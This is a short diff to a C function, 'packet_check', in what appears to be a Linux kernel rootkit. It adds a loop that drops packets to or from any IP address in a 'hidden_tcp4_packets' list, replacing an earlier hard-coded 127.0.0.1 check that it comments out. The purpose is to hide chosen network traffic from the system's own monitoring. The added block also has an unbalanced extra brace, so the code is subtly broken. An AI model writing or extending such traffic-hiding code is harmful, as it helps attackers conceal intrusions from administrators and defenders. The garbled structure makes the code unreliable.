@@ -1058,17 +1058,35 @@ int packet_check(struct sk_buff *skb)
 
 		pr_info("LOCAL  %s", drop_ip);
 		pr_info("SOURCE %s", source_ip);
-		pr_info("DEST   %s", dest_ip);		
+		pr_info("DEST   %s", dest_ip);
+		
+		
+		list_for_each_entry ( p, &hidden_tcp4_packets, list )
+		{
+		    //sprintf(port, ":%04X", hp->port);
 
+		    if( (strcmp(source_ip,p->ip) == 0) || (strcmp(dest_ip,p->ip) == 0 ) ) {
+		    {
+		         //debug("IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);
+			pr_info("Detecting packet from IP list. Blocking\n");
+
+			/* ip in list, should be hidden */
+			return 1;
+	            }
+		}
+		
+		
+		/*
 		//if((u8 *)&header->saddr == drop_ip || (u8 *)&header->daddr == drop_ip){
 		if( (strcmp(source_ip,drop_ip) == 0) || (strcmp(dest_ip,drop_ip) == 0 ) ) {
 
 			//debug("IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);
 			pr_info("SE DETECTO 127.0.0.1 FILTRANDO\n");
 
-			/* ip in list, should be hidden */
+			/* ip in list, should be hidden 
 			return 1;
 		}
+		*/
 		
 	}
 
